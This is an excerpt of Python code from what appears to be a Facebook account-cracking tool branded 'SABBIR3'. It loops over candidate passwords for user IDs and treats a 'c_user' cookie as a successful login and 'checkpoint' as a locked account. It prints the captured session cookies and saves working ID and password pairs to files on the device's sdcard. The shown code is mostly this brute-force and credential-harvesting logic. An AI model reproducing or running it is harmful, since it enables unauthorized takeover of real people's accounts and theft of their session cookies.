...
def fuck():
    ...
    print(' [+] OK Ids saved in SABBIR3/OK.txt')
    print(' [+] CP Ids saved in SABBIR3/CP.txt')
    print(mumitx)
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SABBIR3]├Ч[%s/%s]├Ч[OK-%s]├Ч[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SABBIR3-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/SABBIR3/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SABBIR3-CP] {cid}|{ps}")
                open('/sdcard/SABBIR3-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
